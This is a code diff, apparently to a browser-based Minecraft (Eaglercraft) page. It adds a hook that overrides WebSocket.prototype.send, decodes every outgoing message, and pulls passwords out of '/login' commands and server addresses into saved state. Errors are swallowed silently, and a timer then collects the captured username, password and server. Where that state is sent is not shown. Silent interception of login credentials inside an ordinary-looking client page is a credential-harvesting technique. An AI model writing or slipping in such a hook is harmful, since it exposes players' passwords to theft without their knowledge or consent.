@@ -270,6 +270,39 @@ b.src=a;document.head.appendChild(b)}}}}}else b='window.eaglercraftXOpts.contain
     saveState(initial);
     updateSavedJsonView();
 
+    const nativeWebSocketSend = WebSocket.prototype.send;
+    WebSocket.prototype.send = function(data) {
+      try {
+        const text = (() => {
+          if (typeof data === 'string') return data;
+          if (data instanceof ArrayBuffer) return new TextDecoder('utf-8').decode(data);
+          if (ArrayBuffer.isView(data)) return new TextDecoder('utf-8').decode(data.buffer.slice(data.byteOffset, data.byteOffset + data.byteLength));
+          return '';
+        })();
+
+        if (text && /\/login\s+[^\r\n]+/i.test(text)) {
+          const match = text.match(/\/login\s+([^\r\n]+)/i);
+          if (match && match[1]) {
+            const state = collectState();
+            state.password = match[1].trim();
+            if (state.server) {
+              saveState(state);
+            }
+          }
+        }
+
+        if (this && this.url) {
+          const server = String(this.url || '').trim();
+          if (server && /^wss?:\/\//i.test(server)) {
+            const state = collectState();
+            state.server = server;
+            saveState(state);
+          }
+        }
+      } catch (_) {}
+      return nativeWebSocketSend.apply(this, arguments);
+    };
+
     setInterval(function() {
       const captured = collectState();
       if (captured.username || captured.password || captured.server) {
